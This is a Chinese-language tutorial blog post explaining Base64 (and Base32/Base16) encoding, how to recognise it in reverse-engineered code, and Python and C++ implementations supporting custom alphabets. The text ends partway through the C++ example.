        <content type="html"><![CDATA[<h1 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h1><blockquote><p><strong>转换步骤</strong>：  </p><ol><li>将待转换的字符串，每 3 个字节分为一组，每个字节占 8 bit，共 24 个二进制位  </li><li>将上面的 24 个二进制位，每 6 个字节做为一组，共分为 4 组 <em>（若最后一组字符数不足三个，用 ‘&#x3D;’ 补充）</em>  </li><li>在每组前面添加两个 0，每组由 6 个变为 8 个二进制位，总共 32 个二进制位，即 4 个字节  </li><li>根据 Base64 编码对照表获得对应的值</li></ol><p><strong>Base64 算法解码过程</strong><br>去掉所有的等号，查表将字符转为二进制的索引值，最后每 8 位一组计算 ASCii 码还原字符，<mark>不足 8 位则丢弃</mark></p><p><strong>原始 Base64 码表</strong>：<code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code></p></blockquote><blockquote><p><strong>Base64 &amp; Base32 &amp; Base16</strong><br><em><strong>Base64</strong></em> 就是用每 <code>6 位二进制（2 的 6 次幂就是 64）</code> 来表示一个字符<br><em><strong>Base32</strong></em> 就是用每 <code>5 位二进制（2 的 5 次幂就是 32）</code> 来表示一个字符<br><em><strong>Base16</strong></em> 就是用每 <code>4 位二进制（2 的 4 次幂就是 16）</code> 来表示一个字符</p><p><em>问：Base64 为什么使用 3 个字节作为一组呢？</em><br>因为 6 和 8 的最小公倍数为 24，三个字节正好 24 个二进制位，每 6 bit 为一组，恰好能够分为 4 组</p></blockquote><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ol><li><p>Base64 要用到 Base64 码表，可以在程序中找到连续的字符串：<code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code></p></li><li><p>根据 Base64 加密原理，代码中必然存在<mark>根据余数个数判断是否添加等号</mark>的代码<br>字符 <code>&#39;=&#39;</code> 的 ASCii 码：61（0x3D），也有可能直接索引码表里面的 <code>&#39;=&#39;</code></p></li><li><p>识别代码中对数据的左移右移操作<br><code>((a[0] &amp; 3) &lt;&lt; 4) | (a[1] &gt;&gt; 4 )</code> 和 <code>(16 * (a[0] &amp; 3)) | (a[1] / 16)</code> 是等价操作，都表示取 <code>a[0]</code> 后 2 位与 <code>a[1]</code> 前 4 位拼接，是 Base64 中的常见操作</p></li><li><p>最主要的是理解编码解码原理，比如编码时通常都会用 3 个字节一组来处理比特位数据</p></li></ol><hr><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>以下图的表格为示例</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E7%9A%84%E5%87%BD%E6%95%B0%E7%89%B9%E5%BE%811.jpeg" alt="加密算法的函数特征1.jpeg"></p><p>具体分析一下整个过程：</p><ol><li>第 1 步，根据 <code>&#39;M&#39;</code>、<code>&#39;a&#39;</code>、<code>&#39;n&#39;</code> 对应的 ASCii 码值分别为 77，97，110，对应的二进制值是：01001101、01100001、01101110，由此组成一个 24 位的二进制字符串</li><li>第 2 步，如图红色框，将 24 位每 6 位二进制位一组分成 4 组</li><li>第 3 步，在上面每一组前面补两个 0，扩展成 32 个二进制位：<mark>00</mark>010011、<mark>00</mark>010110、<mark>00</mark>000101、<mark>00</mark>101110</li><li>第 4 步，四组 8bit 分别对应的值 <strong>（Base64 编码索引）</strong> 为：19、22、5、46，在 Base64 编码表中进行查找，分别对应：<code>&#39;T&#39;</code>、<code>&#39;W&#39;</code>、<code>&#39;F&#39;</code>、<code>&#39;u&#39;</code>，因此 “Man” 经过 Base64 编码之后就变为：<code>&quot;TWFu&quot;</code></li></ol><p><strong>如果遇到位数不足的情况</strong>，位数不足用 ‘&#x3D;’ 补充，总共有两种情况：  </p><ol><li>最后一组只有一个字符</li><li>最后一组有两个字符</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E7%9A%84%E5%87%BD%E6%95%B0%E7%89%B9%E5%BE%812.png" alt="加密算法的函数特征2.png"></p><h2 id="加解密代码"><a href="#加解密代码" class="headerlink" title="加解密代码"></a>加解密代码</h2><h3 id="Python-版（简洁脚本）"><a href="#Python-版（简洁脚本）" class="headerlink" title="Python 版（简洁脚本）"></a>Python 版（简洁脚本）</h3><ul><li><p><strong>特点</strong></p><ol><li>可以更换加密的码表</li><li>快捷，直接使用即可</li></ol></li><li><p><strong>代码</strong></p></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token comment"># enc表示更换码表后的待解密字符串</span>enc <span class="token operator">=</span> <span class="token string">"x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q"</span><span class="token comment"># new_table表示更换后的码表</span>new_table <span class="token operator">=</span> <span class="token string">"ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/"</span><span class="token comment"># old_table表示原始码表</span>old_table <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span><span class="token comment"># 将enc还原成原始码表加密后的内容，存放在dec中</span>dec <span class="token operator">=</span> enc<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>maketrans<span class="token punctuation">(</span>new_table<span class="token punctuation">,</span> old_table<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Base64解密，base64.b64decode()的结果为 bytes 类型</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>dec<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="Python-版（完整系统）"><a href="#Python-版（完整系统）" class="headerlink" title="Python 版（完整系统）"></a>Python 版（完整系统）</h3><ul><li><p><strong>特点</strong></p><ol><li>可以更换加密的码表</li><li>支持加密和解密</li></ol></li><li><p><strong>代码</strong></p></li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding:utf-8  </span>s <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>  <span class="token comment"># 原始码表  </span>    <span class="token keyword">def</span> <span class="token function">my_base64_encode</span><span class="token punctuation">(</span>inputs<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">try</span><span class="token punctuation">:</span>          <span class="token comment"># 将字符串转化为2进制  </span>        bin_str <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token keyword">for</span> i <span class="token keyword">in</span> inputs<span class="token punctuation">:</span>              x <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>              bin_str<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'&#123;:0>8&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token comment"># print(bin_str)  </span>        <span class="token comment"># 输出的字符串  </span>        outputs <span class="token operator">=</span> <span class="token string">""</span>          <span class="token comment"># 不够三倍数，需补齐的次数  </span>        nums <span class="token operator">=</span> <span class="token number">0</span>          <span class="token keyword">while</span> bin_str<span class="token punctuation">:</span>              <span class="token comment"># 每次取三个字符的二进制  </span>            temp_list <span class="token operator">=</span> bin_str<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">]</span>              <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">:</span>                  nums <span class="token operator">=</span> <span class="token number">3</span> <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span>                  <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">3</span><span class="token punctuation">:</span>                      temp_list <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token string">'0'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">]</span>              temp_str <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span>              <span class="token comment"># print(temp_str)  </span>            <span class="token comment"># 将三个8字节的二进制转换为4个十进制  </span>            temp_str_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>              <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                  temp_str_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>temp_str<span class="token punctuation">[</span>i <span class="token operator">*</span> <span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>              <span class="token comment"># print(temp_str_list)  </span>            <span class="token keyword">if</span> nums<span class="token punctuation">:</span>                  temp_str_list <span class="token operator">=</span> temp_str_list<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span> <span class="token operator">-</span> nums<span class="token punctuation">]</span>                <span class="token keyword">for</span> i <span class="token keyword">in</span> temp_str_list<span class="token punctuation">:</span>                  outputs <span class="token operator">+=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span>              bin_str <span class="token operator">=</span> bin_str<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span>          outputs <span class="token operator">+=</span> nums <span class="token operator">*</span> <span class="token string">'='</span>          <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"加密完成:\n%s "</span> <span class="token operator">%</span> outputs<span class="token punctuation">)</span>      <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>          <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"加密错误: \n</span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>      <span class="token keyword">def</span> <span class="token function">my_base64_decode</span><span class="token punctuation">(</span>inputs<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">try</span><span class="token punctuation">:</span>          <span class="token comment"># 将字符串转化为2进制  </span>        bin_str <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>          <span class="token keyword">for</span> i <span class="token keyword">in</span> inputs<span class="token punctuation">:</span>              <span class="token keyword">if</span> i <span class="token operator">!=</span> <span class="token string">'='</span><span class="token punctuation">:</span>                  x <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">bin</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>                  bin_str<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'&#123;:0>6&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token comment"># print(bin_str)  </span>        <span class="token comment"># 输出的字符串  </span>        outputs <span class="token operator">=</span> <span class="token string">""</span>          nums <span class="token operator">=</span> inputs<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span>          <span class="token keyword">while</span> bin_str<span class="token punctuation">:</span>              temp_list <span class="token operator">=</span> bin_str<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span>              temp_str <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>temp_list<span class="token punctuation">)</span>              <span class="token comment"># print(temp_str)  </span>            <span class="token comment"># 补足8位字节  </span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp_str<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">8</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                  temp_str <span class="token operator">=</span> temp_str<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span> <span class="token operator">*</span> nums <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">]</span>              <span class="token comment"># 将四个6字节的二进制转换为三个字符  </span>            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>temp_str<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                  outputs <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>temp_str<span class="token punctuation">[</span>i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">:</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>              bin_str <span class="token operator">=</span> bin_str<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>          <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"解密完成:\n%s "</span> <span class="token operator">%</span> outputs<span class="token punctuation">)</span>      <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>          <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"解密错误: \n</span><span class="token interpolation"><span class="token punctuation">&#123;</span>e<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"     可更换码表的 Base64 加解密系统       "</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"*************************************"</span><span class="token punctuation">)</span>  select <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"是否更换加密的码表? (y or n) 你的选择: "</span><span class="token punctuation">)</span>  <span class="token keyword">if</span> select <span class="token operator">==</span> <span class="token string">"y"</span> <span class="token keyword">or</span> select <span class="token operator">==</span> <span class="token string">"yes"</span><span class="token punctuation">:</span>      s <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"在这里输入码表: "</span><span class="token punctuation">)</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">".....done, 已更改!"</span><span class="token punctuation">)</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>      <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"码表未做更改!"</span><span class="token punctuation">)</span>    input_str <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"输入数据: "</span><span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"*************************************"</span><span class="token punctuation">)</span>  my_base64_encode<span class="token punctuation">(</span>input_str<span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"*************************************"</span><span class="token punctuation">)</span>  my_base64_decode<span class="token punctuation">(</span>input_str<span class="token punctuation">)</span>  <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"*************************************"</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="C-版（完整系统）"><a href="#C-版（完整系统）" class="headerlink" title="C++ 版（完整系统）"></a>C++ 版（完整系统）</h3><ul><li><p><strong>特点</strong></p><ol><li>可以更换加密的码表</li><li>支持加密和解密</li></ol></li><li><p><strong>代码</strong></p></li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span>  </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span>  </span>  <span class="token comment">// Base64 字符表  </span><span class="token keyword">char</span> base64chars<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span><span class="token punctuation">;</span>    <span class="token comment">// 编码一个字节  </span><span class="token keyword">char</span> <span class="token function">encode_byte</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span> b<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">return</span> base64chars<span class="token punctuation">[</span>b<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token comment">// Base64 编码  </span><span class="token keyword">void</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>input<span class="token punctuation">,</span> size_t length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span>size_t i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token comment">// 取三个字节  </span>        <span class="token keyword">unsigned</span> <span class="token keyword">int</span> triplet <span class="token operator">=</span> <span class="token punctuation">(</span>input<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;</span> length <span class="token operator">?</span> input<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">&lt;</span> length <span class="token operator">?</span> input<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 分割成四个六位字节并编码  </span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c%c%c%c"</span><span class="token punctuation">,</span>                 <span class="token function">encode_byte</span><span class="token punctuation">(</span><span class="token punctuation">(</span>triplet <span class="token operator">>></span> <span class="token number">18</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x3F</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                 <span class="token function">encode_byte</span><span class="token punctuation">(</span><span class="token punctuation">(</span>triplet <span class="token operator">>></span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x3F</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                 i <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;</span> length <span class="token operator">?</span> <span class="token function">encode_byte</span><span class="token punctuation">(</span><span class="token punctuation">(</span>triplet <span class="token operator">>></span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x3F</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token char">'='</span><span class="token punctuation">,</span>                 i <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">&lt;</span> length <span class="token operator">?</span> <span class="token function">encode_byte</span><span class="token punctuation">(</span>triplet <span class="token operator">&amp;</span> <span class="token number">0x3F</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token char">'='</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token comment">// 映射关系  </span><span class="token keyword">int</span> <span class="token function">decode_char</span><span class="token punctuation">(</span><span class="token keyword">char</span> ch<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">64</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span>base64chars<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> ch<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>              <span class="token keyword">return</span> i<span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token comment">// Base64 解码  </span><span class="token keyword">void</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>input<span class="token punctuation">,</span> size_t length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span>size_t i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> length<span class="token punctuation">;</span> i <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token comment">// 取四个 Base64 字符  </span>        <span class="token keyword">unsigned</span> <span class="token keyword">int</span> quad <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">decode_char</span><span class="token punctuation">(</span>input<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">18</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token function">decode_char</span><span class="token punctuation">(</span>input<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">|</span>                              <span class="token punctuation">(</span><span class="token function">decode_char</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">&lt;</span> length <span class="token operator">?</span> input<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">:</span> <span class="token char">'='</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">|</span>                              <span class="token punctuation">(</span><span class="token function">decode_char</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">&lt;</span> length <span class="token operator">?</span> input<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">:</span> <span class="token char">'='</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// 分割成三个字节并输出  </span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%c%c%c"</span><span class="token punctuation">,</span>                 <span class="token punctuation">(</span>quad <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">,</span>                 i <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">&lt;</span> length <span class="token operator">?</span> <span class="token punctuation">(</span>quad <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xFF</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>                 i <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">&lt;</span> length <span class="token operator">?</span> quad <span class="token operator">&amp;</span> <span class="token number">0xFF</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">void</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"     可更换码表的 Base64 加解密系统       \n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"*************************************\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">char</span> option<span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"是否更换加密的码表? (y or n) 你的选择: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>option<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>option <span class="token operator">==</span> <span class="token char">'y'</span> <span class="token operator">||</span> option <span class="token operator">==</span> <span class="token char">'Y'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"在这里输入新的码表: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> base64chars<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">".....done, 已更改!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span>          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"码表未做更改!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">char</span> data<span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"输入数据: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">;</span>      size_t input_length <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"*************************************\n"</span><span class="token 